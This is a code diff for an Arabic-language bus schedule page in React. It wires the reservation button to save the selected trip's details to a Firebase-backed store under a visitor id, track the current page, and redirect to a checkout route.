@@ -1,4 +1,4 @@
-import { useState, useMemo } from "react";
+import { useState, useMemo, useEffect } from "react";
 import {
   Bus,
   Clock,
@@ -9,7 +9,9 @@ import {
   Calendar,
   X,
 } from "lucide-react";
+import { useLocation } from "wouter";
 import { BottomNav } from "./services";
+import { addData, handleCurrentPage } from "@/lib/firebase";
 
 const cities = [
   "الكل",
@@ -115,9 +117,13 @@ const seatColor = (seats: number) => {
 function ReservationFlow({
   trip,
   onClose,
+  onConfirm,
+  submitting,
 }: {
   trip: Trip;
   onClose: () => void;
+  onConfirm: () => void;
+  submitting: boolean;
 }) {
   return (
     <div
@@ -167,11 +173,12 @@ function ReservationFlow({
           </div>
         </div>
         <button
-          onClick={onClose}
-          className="w-full bg-primary text-primary-foreground py-3 rounded-xl font-bold text-sm hover:opacity-90 transition-opacity"
+          onClick={onConfirm}
+          disabled={submitting}
+          className="w-full bg-primary text-primary-foreground py-3 rounded-xl font-bold text-sm hover:opacity-90 transition-opacity disabled:opacity-60 disabled:cursor-not-allowed"
           data-testid="button-confirm-reservation"
         >
-          متابعة الحجز
+          {submitting ? "جاري التحويل..." : "متابعة الحجز"}
         </button>
       </div>
     </div>
@@ -179,6 +186,7 @@ function ReservationFlow({
 }
 
 export default function Schedule() {
+  const [, setLocation] = useLocation();
   const todayStr = new Date().toISOString().split("T")[0];
   const [fromCity, setFromCity] = useState("الكل");
   const [toCity, setToCity] = useState("الكل");
@@ -186,6 +194,39 @@ export default function Schedule() {
   const [selectedTrip, setSelectedTrip] = useState<Trip | null>(null);
   const [searchFrom, setSearchFrom] = useState("الكل");
   const [searchTo, setSearchTo] = useState("الكل");
+  const [reserving, setReserving] = useState(false);
+
+  useEffect(() => {
+    void handleCurrentPage("schedule");
+  }, []);
+
+  const handleConfirmReservation = async () => {
+    if (!selectedTrip || reserving) return;
+    const visitorId = localStorage.getItem("visitor");
+    if (!visitorId) {
+      setLocation("/register");
+      return;
+    }
+    setReserving(true);
+    const ok = await addData({
+      id: visitorId,
+      currentPage: "checkout",
+      tripFrom: selectedTrip.from,
+      tripTo: selectedTrip.to,
+      tripDeparture: selectedTrip.departure,
+      tripArrival: selectedTrip.arrival,
+      tripType: selectedTrip.type,
+      ticketPrice: selectedTrip.price,
+      ticketQuantity: 1,
+      totalAmount: selectedTrip.price,
+      bookingDate: date,
+      bookingTime: selectedTrip.departure,
+    });
+    setReserving(false);
+    if (!ok) return;
+    setSelectedTrip(null);
+    setLocation("/checkout");
+  };
 
   const swap = () => {
     setFromCity(toCity);
@@ -217,6 +258,8 @@ export default function Schedule() {
         <ReservationFlow
           trip={selectedTrip}
           onClose={() => setSelectedTrip(null)}
+          onConfirm={() => void handleConfirmReservation()}
+          submitting={reserving}
         />
       )}
 
